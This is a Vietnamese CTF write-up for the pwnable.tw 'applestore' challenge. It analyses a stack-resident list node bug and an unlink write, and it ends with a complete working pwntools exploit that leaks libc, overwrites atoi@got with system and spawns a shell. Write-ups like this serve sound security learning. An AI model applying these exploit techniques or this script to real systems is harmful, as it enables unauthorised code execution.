+++
title = 'Pwnable.tw - applestore'
date = 2026-09-18T21:37:41+07:00
draft = false
categories = ["pwn"]
series = ["Pwnable.tw"]
+++

## applestore

`nc chall.pwnable.tw 10104`

### 1. Phân tích Binary

```js
pwndbg> checksec
File:       /home/lwd3c/Desktop/Pwn/pwnable.tw/applestore/applestore_patched
Arch:       i386-32-little
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x8046000)
RUNPATH:    b'.'
Stripped:   No
```

`Partial RELRO` nên GOT ghi được. Canary có nhưng không dùng tới vì không đi đường overflow.

libc đi kèm là glibc 2.23 (chưa có tcache). Chạy local phải dùng **môi trường rỗng** (`env={}`) thì bố cục stack mới khớp remote.

Menu: `1` xem danh sách, `2` thêm, `3` xoá, `4` xem giỏ, `5` checkout, `6` thoát. Mỗi item là một node `malloc(0x10)` trong doubly linked list:

```c
+0x0  char *name
+0x4  int   price
+0x8  node *next
+0xc  node *prev
```

Node sentinel ở `0x804b068`, `head` thật ở `0x804b070`.

#### Bug 1 - node nằm trên stack

```c
// checkout() @ 0x8048b3b
int total = cart();
if (total == 0x1c06) {                    // 7174
    puts("*: iPhone 8 - $1");
    asprintf(&item, "%s", "iPhone 8");
    item.price = 1;
    insert(&item);                        // item là biến LOCAL trên stack
    total = 0x1c07;
}
```

```c
// insert() @ 0x8048835
node *cur = &sentinel;
while (cur->next) cur = cur->next;
cur->next     = newitem;
newitem->prev = cur;
/* newitem->next KHÔNG được khởi tạo -> rác trên stack */
```

Sau một lần checkout thành công, danh sách có một node nằm trên **stack**, và trường `next` của nó là rác còn sót trên frame.

#### Bug 2 - frame dùng chung

`handler()` là vòng lặp `do { ... } while(1)`, nên mọi hàm con (`checkout`, `cart`, `delete`, `add`) đều được gọi tại cùng một `esp`, frame `ebp` của chúng trùng địa chỉ qua mỗi vòng. Node trên stack vì thế nằm chồng lên buffer nhập liệu của hàm con:

```js
buffer của cart/delete : [ebp - 0x22] = 0xffffc8b6
node trên stack        : [ebp - 0x20] = 0xffffc8b8   (= buf + 2)
```

Gửi `b'yy' + <16 bytes>` là ghi thẳng vào 4 trường của node: `name`, `price`, `next`, `prev`.

### 2. Khai thác

#### Tạo node stack

Tổng giỏ hàng phải đúng `7174` = `0x1c06`:

```js
19 x iPhone 6   ($199) = 3781
6  x iPad Air 2 ($499) = 2994
1  x iPad Mini 3 ($399) = 399
                 tổng  = 7174
```

`checkout('y')` chèn node stack vào cuối, nó thành item số **27**.

#### Arbitrary read - leak libc

`cart` in mỗi node theo `"%d: %s - $%d\n"`, nên ghi đè `name` là đọc được `%s` tại địa chỉ bất kỳ.

```py
cart(io, b'yy' + p32(exe.got['read']) + p32(0) + p32(0) + p32(0))
READ = u32(io.recv(4))
libc.address = READ - libc.symbols['read']
```

Leak tiếp `*environ` để có mốc stack:

```py
ENV = leak_ptr(io, libc.sym['environ'])
DELETE_EBP = ENV - 260
```

Hằng `260` đo một lần bằng gdb. Nó cố định vì mảng `envp` và các frame nằm trên cùng stack gốc, môi trường to lên thì cả hai dời đi cùng một lượng. Trong gdb nhớ đọc là `*(unsigned*)&environ`, tham chiếu `environ` trần dễ bị resolve sai.

#### Arbitrary write - unlink trong `delete`

```c
next = cur->next;  prev = cur->prev;
if (prev) prev->next = next;   // ghi #1: [prev+8]  = next
if (next) next->prev = prev;   // ghi #2: [next+12] = prev
```

Không ghi thẳng `system` vào GOT được: `prev` vừa là địa chỉ ghi (`[prev+8]`) vừa là giá trị được ghi (`[next+12]`), nên nó bắt buộc phải là địa chỉ ghi được, không thể là địa chỉ code trong libc.

Cách vòng: dùng primitive này đặt một **địa chỉ GOT vào saved EBP của `delete`**. Khi `delete` trả về `handler`, frame của `handler` được dựng lại ngay trên GOT, và buffer nhập của nó rơi đúng vào `atoi@got`.

```py
delete(io, b'27' + struct_(0x08048f88, 0, DEB - 0xc, exe.got['atoi'] + 0x22))
```

- `next = DELETE_EBP - 0xc` nên ghi #2 đáp đúng vào `[DELETE_EBP]`
- `prev = atoi@got + 0x22` là giá trị được ghi; ghi #1 chạm `[atoi@got + 0x2a]`, chỗ padding của GOT nên vô hại
- `name` để trỏ vào một chuỗi rodata cho `printf("Remove %d:%s")` không crash

Sau khi `delete` trả về thì `ebp` của `handler` bằng `atoi@got + 0x22`, nên buffer `[ebp - 0x22]` chính là `atoi@got = 0x0804b040`.

#### `system("/bin/sh")`

```py
io.sendafter(b'> ', p32(libc.sym['system']) + b';/bin/sh;')
```

Lần nhập menu kế tiếp ghi thẳng lên `atoi@got`. `handler` gọi `atoi(buf)` giờ thành `system(buf)`, với buf là `<rác>;/bin/sh;` - `sh` báo lỗi phần rác rồi chạy `/bin/sh`.

```bash
[+] read@got = 0xf75fe1c0   libc base = 0xf752a000
$ id
uid=1000(applestore) gid=1000(applestore) groups=1000(applestore)
$ cat /home/applestore/flag
FLAG{I_th1nk_th4t_you_c4n_jB_1n_1ph0n3_8}
```

`FLAG: FLAG{I_th1nk_th4t_you_c4n_jB_1n_1ph0n3_8}`

```py
#!/usr/bin/env python3
from pwn import *

exe = ELF('./applestore_patched', checksec=False)
libc = ELF('./libc_32.so.6', checksec=False)
context.binary = exe
context.log_level = 'info'

OFF_DELETE_EBP_FROM_ENVIRON = 260   # *environ - delete_ebp (env rỗng / remote)

def conn():
    if args.REMOTE:
        return remote('chall.pwnable.tw', 10104)
    # interp là ./ld-2.23.so, RUNPATH '.', env rỗng để khớp remote
    return process(['./applestore_patched'], env={})

def add(io, idx):        io.sendafter(b'> ', b'2'); io.sendafter(b'Device Number> ', idx)
def cart(io, payload):   io.sendafter(b'> ', b'4'); io.sendafter(b'ok? (y/n) > ', payload)
def checkout(io, y):     io.sendafter(b'> ', b'5'); io.sendafter(b'ok? (y/n) > ', y)
def delete(io, payload): io.sendafter(b'> ', b'3'); io.sendafter(b'Item Number> ', payload)

def struct_(n, p, nx=0, pv=0): return p32(n) + p32(p) + p32(nx) + p32(pv)

def leak_ptr(io, name_ptr):
    cart(io, b'yy' + struct_(name_ptr, 0))
    io.recvuntil(b'27: ')
    return u32(io.recv(4))

io = conn()

for _ in range(19): add(io, b'1')   # iPhone 6  $199
for _ in range(6):  add(io, b'3')   # iPad Air 2 $499
add(io, b'4')                       # iPad Mini 3 $399  -> tổng 7174
checkout(io, b'y')                  # node stack thành item #27

READ = leak_ptr(io, exe.got['read'])
libc.address = READ - libc.symbols['read']
log.success("read=%08x libc=%08x" % (READ, libc.address))

ENV = leak_ptr(io, libc.sym['environ'])
DEB = ENV - OFF_DELETE_EBP_FROM_ENVIRON
log.success("environ=%08x delete_ebp=%08x system=%08x" % (ENV, DEB, libc.sym['system']))

delete(io, b'27' + struct_(0x08048f88, 0, DEB - 0xc, exe.got['atoi'] + 0x22))
io.sendafter(b'> ', p32(libc.sym['system']) + b';/bin/sh;')

io.interactive()
```
